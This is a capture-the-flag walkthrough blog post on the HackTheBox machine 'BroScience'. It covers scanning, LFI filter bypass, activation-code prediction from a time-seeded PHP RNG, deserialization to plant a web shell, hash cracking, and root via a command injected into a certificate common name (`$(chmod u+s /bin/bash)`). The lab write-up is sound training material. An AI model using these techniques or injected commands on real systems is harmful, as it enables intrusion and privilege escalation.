---
title: "BROSCIENCE HACKTHEBOX [MEDIUM] "
layout: page
date: 2023-01-18
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: false
tag:
- markdown
- elements
star: true
category: blog
author: Hashar Mujahid
description: BroScience Walkthrough.
---

Hi, My name is Hashar Mujahid and today we are going to solve a medium box named BroScience on hackthebox.

![](https://miro.medium.com/max/770/1*ePr4D3_ItFhCRkCJcmoIZg.png)

Let’s start with the TCP nmap scan.

## **PORTSCAN:**
```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ sudo nmap -sC -sV -oA nmap/tcp -p- --min-rate 1500 10.10.11.195                        
[sudo] password for hax-13:                                                                                                                             
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-17 09:13 PKT                                                                                         
Nmap scan report for 10.10.11.195                                                                                                                       
Host is up (0.50s latency).                                                                                                                             
Not shown: 65532 closed ports                                                                                                                           
PORT    STATE SERVICE  VERSION                                                                                                                          
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)                                                                                    
80/tcp  open  http     Apache httpd 2.4.54                                                                                                              
|_http-server-header: Apache/2.4.54 (Debian)                                                                                                            
|_http-title: Did not follow redirect to https://broscience.htb/                                                                                        
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))                                                                                                   
| http-cookie-flags:                                                                                                                                    
|   /:                                                                                                                                                  
|     PHPSESSID:                                                                                                                                        
|_      httponly flag not set                                                                                                                           
|_http-server-header: Apache/2.4.54 (Debian)                                                                                                            
|_http-title: BroScience : Home                                                                                                                         
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT                                                               
| Not valid before: 2022-07-14T19:48:36                                                                                                                 
|_Not valid after:  2023-07-14T19:48:36                                                                                                                 
| tls-alpn:                                                                                                                                             
|_  http/1.1                                                                                                                                            
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                           
                                                                                                                                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                          
Nmap done: 1 IP address (1 host up) scanned in 90.67 seconds   
```

Add `broscience.htb` to the hosts file.

**UDP SCAN:**

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ sudo nmap -sU -p 1-200 broscience.htb -oA nmap/udp-200  
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-17 09:31 PKT  
Nmap scan report for broscience.htb (10.10.11.195)  
Host is up (0.25s latency).  
Not shown: 199 closed ports  
PORT   STATE         SERVICE  
68/udp open|filtered dhcpc  
  
Nmap done: 1 IP address (1 host up) scanned in 213.74 seconds
```

## **WEBSITE [PORT 80 & 443]:**

When we try to visit the web port 80 redirects the user to port 443 to communicate over SSL.

![](https://miro.medium.com/max/770/1*42v5rkCds-5EXMwz1EiEmQ.png)

Web is built using php

Found an email address from the SSL cert that website contains. administrator@broscience.htb.

**Directory Scan:**

I used fuff tool for directory scans you can also use tools like dirsearch, gobuster etc.
```bash

________________________________________________  
  
 :: Method           : GET  
 :: URL              : https://broscience.htb/FUZZ  
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/common.txt  
 :: Extensions       : .php   
 :: Follow redirects : false  
 :: Calibration      : false  
 :: Timeout          : 10  
 :: Threads          : 40  
 :: Matcher          : Response status: 200,204,301,302,307,401,403  
________________________________________________  
  
.hta.php                [Status: 403, Size: 280, Words: 20, Lines: 10]  
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]  
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10]  
.htpasswd.php           [Status: 403, Size: 280, Words: 20, Lines: 10]  
.htaccess.php           [Status: 403, Size: 280, Words: 20, Lines: 10]  
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]  
activate.php            [Status: 200, Size: 1256, Words: 293, Lines: 28]  
comment.php             [Status: 302, Size: 13, Words: 3, Lines: 1]  
images                  [Status: 301, Size: 319, Words: 20, Lines: 10]  
includes                [Status: 301, Size: 321, Words: 20, Lines: 10]  
index.php               [Status: 200, Size: 9308, Words: 3953, Lines: 147]  
index.php               [Status: 200, Size: 9308, Words: 3953, Lines: 147]  
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10]  
login.php               [Status: 200, Size: 1936, Words: 567, Lines: 42]  
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]  
manual                  [Status: 301, Size: 319, Words: 20, Lines: 10]  
register.php            [Status: 200, Size: 2161, Words: 635, Lines: 45]  
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]  
styles                  [Status: 301, Size: 319, Words: 20, Lines: 10]  
user.php                [Status: 200, Size: 1309, Words: 300, Lines: 29]

```
Found Some interesting directories. let’s visit them and see what we can find.

## **SIGNUP:**

![](https://miro.medium.com/max/770/1*CBA-36PiGf6NeHY3Y-nrdQ.png)

>Registering

After registration we got a msg.

![](https://miro.medium.com/max/770/1*ItBix81Y33m5pAInp8xhJg.png)

>Activation code.

When we try to log in we get that account has not been activated yet so we need to activate the account to expand our scope.

![](https://miro.medium.com/max/770/1*zMd5mg7g3uqOF6PQ6YsJMg.png)

>Login

We found an activate.php let's visit it.

![](https://miro.medium.com/max/770/1*1VzvQKuBY-mvVaASDp94aQ.png)

Looks like there should be a parameter that contains a input.So let’s use arjun to find a parameter.

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ arjun -u https://broscience.htb/activate.php? │1  
_ │.  
/_| _ ' │1  
( |/ /(//) v2.2.1 │9  
_/ │5  
│$  
[*] Probing the target for stability │  
[*] Analysing HTTP response for anomalies ├─  
[*] Analysing HTTP response for potential parameter names │c  
[*] Logicforcing the URL endpoint │e  
[✓] parameter detected: code, based on: body length │-  
[+] Parameters found: code
```

We found a code parameter.

We also found a user.php page which also takes a parameter to let’s figure out what parameter is used.

```bash
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ arjun -u https://broscience.htb/user.php?  
_  
/_| _ '  
( |/ /(//) v2.2.1  
_/  
  
[*] Probing the target for stability  
[*] Analysing HTTP response for anomalies  
[*] Analysing HTTP response for potential parameter names  
[*] Logicforcing the URL endpoint  
[-] Connection timed out, increased timeout by 5 seconds  
[✓] parameter detected: id, based on: body length  
[+] Parameters found: id
```

But till now nothing seems to work we can access some details about other users using the above parameter but that will not help us root the box.

![](https://media.giphy.com/media/B4dt6rXq6nABilHTYM/giphy.gif)
![](https://giphy.com/gifs/theoffice-the-office-tv-casino-night-vDlw1tKNwx40BGbWcQ?utm_source=iframe&utm_medium=embed&utm_campaign=Embeds&utm_term=https%3A%2F%2Fcdn.embedly.com%2F)

After looking into the files found a directory that should not normally be public and that is `includes`.

![Source code files](https://miro.medium.com/max/625/1*ZdEhFKVlW0_uxscyTI3VKQ.png)



Let's try to open them. After opening everyone didn’t find anything interesting other that a unique response from img.php.

![](https://miro.medium.com/max/770/1*SyXqoP6LJbnVbb0FuJ6Hcw.png)

*Path parameter.

Let’s test it for local file inclusion or **LFI** because the path parameter loads a file from a given path so having an LFI laying around would be pretty interesting.

![](https://miro.medium.com/max/770/1*6TNEjIv74Teg_xbScjc5zw.png)

*ATTACK DETECTED RUNNNNN!!!!

Some kind of filter is applied which stops us from retrieving the file let’s try to bypass it.

## **LOCAL FILE INCLUSION AND BYPASSING FILTERS:**

We can bypass the filter using the double encoding method. Which works by double encoding your payload with URL encoding.

![](https://miro.medium.com/max/770/1*c2OTheN9YUr5y0knOY_LDQ.png)

Source Code retrieved

Let’s retrieve the activate.php so we can see how the activation code is generated for each user.

```php

<?php  
session_start();  
  
// Check if user is logged in already  
if (isset($_SESSION['id'])) {  
header('Location: /index.php');  
}  
  
if (isset($_GET['code'])) {  
// Check if code is formatted correctly (regex)  
if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {  
// Check for code in database  
include_once 'includes/db_connect.php';  
  
$res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');  
$res = pg_execute($db_conn, "check_code_query", array($_GET['code']));  
  
if (pg_num_rows($res) == 1) {  
// Check if account already activated  
$row = pg_fetch_row($res);  
if (!(bool)$row[1]) {  
// Activate account  
$res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');  
$res = pg_execute($db_conn, "activate_account_query", array($row[0]));  
  
$alert = "Account activated!";  
$alert_type = "success";  
} else {  
$alert = 'Account already activated.';  
}  
} else {  
$alert = "Invalid activation code.";  
}  
} else {  
$alert = "Invalid activation code.";  
}  
} else {  
$alert = "Missing activation code.";  
}  
?>  
  
<html>  
<head>  
<title>BroScience : Activate account</title>  
<?php include_once 'includes/header.php'; ?>  
</head>  
<body>  
<?php include_once 'includes/navbar.php'; ?>  
<div class="uk-container uk-container-xsmall">  
<?php  
// Display any alerts  
if (isset($alert)) {  
?>  
<div uk-alert class="uk-alert-<?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?>">  
<a class="uk-alert-close" uk-close></a>  
<?=$alert?>  
</div>  
<?php  
}  
?>  
</div>  
</body>  
</html>
```

Looks like the activation code is 32 characters long. Let’s see in signup.php how it’s generated.

After analyzing the register.php code found the name of the function that is responsible for the generation of activate code( generate_activation_code ).

![](https://miro.medium.com/max/770/1*1vD9L140eAiLEZc181lzIw.png)

SOURCE CODE.

Let’s retrieve it.

![](https://miro.medium.com/max/770/1*FPDoYKSq3oaMiRq-oeCWYQ.png)

Activation code source file.

```php
function generate_activation_code() {  
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";  
srand(time());  
$activation_code = "";  
for ($i = 0; $i < 32; $i++) {  
$activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];  
}  
return $activation_code;  
}
```

>EXPLANATION

This code defines a function called “generate_activation_code” which generates a random string of 32 characters in length. The function starts by defining a string of all lowercase and uppercase letters, as well as digits. The “srand(time())” function seeds the random number generator with the current time so that the sequence of random numbers generated is different each time the program runs. The function then initializes an empty string called “activation_code”. A for loop then runs 32 times, and on each iteration, a random character is chosen from the $chars string and added to the “activation_code” string. Finally, the function returns the activation_code.

We can also use the same script to generate the code if we had an exact time when the request is issued.

## **GENERATING A VALID CODE:**

Get the time when you posted the request for registering the user by using burp. Now all we need to convert the string representation of time to the time format in PHP. I am not a php developer so let’s google.

![](https://miro.medium.com/max/770/1*3D8iMFk2CA7ReDkY5EA4ag.png)

Let’s try this.

```php
<?php  
function generate_activation_code() {  
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";  
srand(strtotime("Tue, 17 Jan 2023 16:45:31 GMT"));  
$activation_code = "";  
for ($i = 0; $i < 32; $i++) {  
$activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];  
}  
echo $activation_code;  
}  
generate_activation_code()  
?>
```

![](https://miro.medium.com/max/770/1*Vj0XnRphNyElYSNgTiO2aA.png)

Code

Let’s try this code to activate our account.

![](https://miro.medium.com/max/770/1*LhcxHEiRb55LF2PG5xcivg.png)

SUCCESSFULLY ACTIVATED

**LOG IN :**

Let’s log in with our new account.

![](https://miro.medium.com/max/770/1*H5lXG2SGFgMHogxr4zEYFA.png)

We can see a new cookie is set. After doing some source code analysis found that a user-pref cookie is generated through serialization techinique which stores the information about the theme and state.

## **FOOTHOLD [WWW-DATA]:**

```php
class Avatar {  
public $imgPath;  
  
public function __construct($imgPath) {  
$this->imgPath = $imgPath;  
}  
  
public function save($tmp) {  
$f = fopen($this->imgPath, "w");  
fwrite($f, file_get_contents($tmp));  
fclose($f);  
}  
}  
  
class AvatarInterface {  
public $tmp;  
public $imgPath;  
  
public function __wakeup() {  
$a = new Avatar($this->imgPath);  
$a->save($this->tmp);  
}  
}  
?>
```

The avatar class has a parameter img path which is used to point to the path of the image and a tmp parameter opens the img and saves its content on the server.

The avatar interface has a method/function named `__wakeup()` which creates a new instance of avatar class and a class save method for the the avatar class.

So theoretically if we were able to set the img-path to our server and make it receive a PHP shell the tmp path will store it on the server and we could trigger a reverse shell after visiting it.

![](https://miro.medium.com/max/770/1*2wbwcfLYE_SulsJF-fXPpQ.png)

SCRIPT

So Let’s run it and see if we succeeded or not.

![](https://miro.medium.com/max/770/1*paJ2HPla4dCtRcKacTKjOg.png)

Generated Cookie

Now just place this cookie in the user-pref and reload the page. Make sure you had a webserver running in the directory where your shell is located.

![](https://miro.medium.com/max/770/1*0kppyvIvdL5x13zzcOQnHQ.png)

Now Our shell is saved in the webserver let’s invoke it.

![](https://miro.medium.com/max/770/1*PWdX24mSo9wzDn81sbXivw.png)

REVERSE SHELL

Let’s stabilize our shell.

![](https://miro.medium.com/max/770/1*xL2HZlLNWrU73YCkyQQimw.png)

## **PRIVILLEGE ESCALATION [BILL]:**

After running linpeas found postgress is running on the localhost adress.

![](https://miro.medium.com/max/770/1*VP7MYC5-p69S7Mxqb62BzA.png)

ACTIVE PORTS

We can use this resource to inract with psql shell.

[

## Top psql commands and flags you need to know | PostgreSQL

### PostgreSQL, or Postgres, is an object-relational database management system that uses the SQL language. It's free…

[hasura.io](https://hasura.io/blog/top-psql-commands-and-flags-you-need-to-know-postgresql/)

We have the credentials to connect to postgress and see if we find any credentials.

![](https://miro.medium.com/max/770/1*eSJDTTvDA3KJKl_U8eSi1g.png)

Connect

Now we can list all the tables in the database using `/dt` command.

![](https://miro.medium.com/max/597/1*WFjemJePfsAWykKIVVnYgA.png)

Tables

Now let’s dump the table.

![](https://miro.medium.com/max/770/1*ouSI6HYx71zPcR9iklW7Uw.png)

Hashes

These are all md5 hashes which are probably salted as well so let’s see if we can crackem.

![](https://miro.medium.com/max/770/1*S8E7QO0mYAyC_OeYydB73A.png)

3 cracked

We were able to crack 3 of them using hashcat by adding salt like “hash:salt” manner.

`hashcat -m 20 hashes /opt/wordlist/rockyou.txt` 

The only user account we have on the home directory is bill. So we might as try to login with the cradential we found using ssh.

![](https://miro.medium.com/max/770/1*fnxPcaLSvKC85hLgBHi0TA.png)

SUCCESS

We were able to Login.

## **PRIVILLEGE ESCALATION[ ROOT ]:**

Run pspy64 on the machine to get the process run by root.

![](https://miro.medium.com/max/770/1*J6aXnqzZMj_LTd8mc6oLOQ.png)

Intresting process

Let’s see what renew.sh does.

```bash
bill@broscience:/opt$ cat renew_cert.sh  
#!/bin/bash  
  
if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then  
echo "Usage: $0 certificate.crt";  
exit 0;  
fi  
  
if [ -f $1 ]; then  
  
openssl x509 -in $1 -noout -checkend 86400 > /dev/null  
  
if [ $? -eq 0 ]; then  
echo "No need to renew yet.";  
exit 1;  
fi  
  
subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)  
  
country=$(echo $subject | grep -Eo 'C = .{2}')  
state=$(echo $subject | grep -Eo 'ST = .*,')  
locality=$(echo $subject | grep -Eo 'L = .*,')  
organization=$(echo $subject | grep -Eo 'O = .*,')  
organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')  
commonName=$(echo $subject | grep -Eo 'CN = .*,?')  
emailAddress=$(openssl x509 -in $1 -noout -email)  
country=${country:4}  
state=$(echo ${state:5} | awk -F, '{print $1}')  
locality=$(echo ${locality:3} | awk -F, '{print $1}')  
organization=$(echo ${organization:4} | awk -F, '{print $1}')  
organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')  
commonName=$(echo ${commonName:5} | awk -F, '{print $1}')  
  
echo $subject;  
echo "";  
echo "Country => $country";  
echo "State => $state";  
echo "Locality => $locality";  
echo "Org Name => $organization";  
echo "Org Unit => $organizationUnit";  
echo "Common Name => $commonName";  
echo "Email => $emailAddress";  
  
echo -e "\nGenerating certificate...";  
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country  
$state  
$locality  
$organization  
$organizationUnit  
$commonName  
$emailAddress  
" 2>/dev/null  
  
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"  
else  
echo "File doesn't exist"  
exit 1;
```

	This script is a bash script that checks the expiration of a given SSL certificate file, and if it is close to expiring, it will print out information about the certificate such as the country, state, organization, and common name. The script takes one argument, the file name of the certificate, and it uses the openssl command to check the certificate’s expiration date and to extract information from the certificate. The script will exit with a status code of 0 if the certificate does not need to be renewed yet, and 1 if the certificate is close to expiring. 

So if we create a certificate that will expire soon the root will generate a new one and we can see the name of the certificate is whatever we put in `$commonname variable` .

So let’s generate a new certificate that will contain malicious code in the common name so root will execute it.

You can use this link to read how to generate a self signed certificate.
[IBM](https://www.ibm.com/docs/en/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl)

![](https://miro.medium.com/max/770/1*iLRaxjwz0Ow9tzyPl3Uhbw.png)

## **Cert Generation**

Now we just have to wait for the process to trigger and we have a root.

The `$(chmod u+s /bin/bash)` is used to modify the permissions on /bin/bash and make it suid.

![](https://miro.medium.com/max/585/1*WcoVdh5d2OgVGYEjRAP-8w.png)

>SUID PERMISSIONS

![](https://miro.medium.com/max/681/1*Mv6RWC_Eum5t1Q3KGhIoHA.png)

We can see we were able to read the root.txt.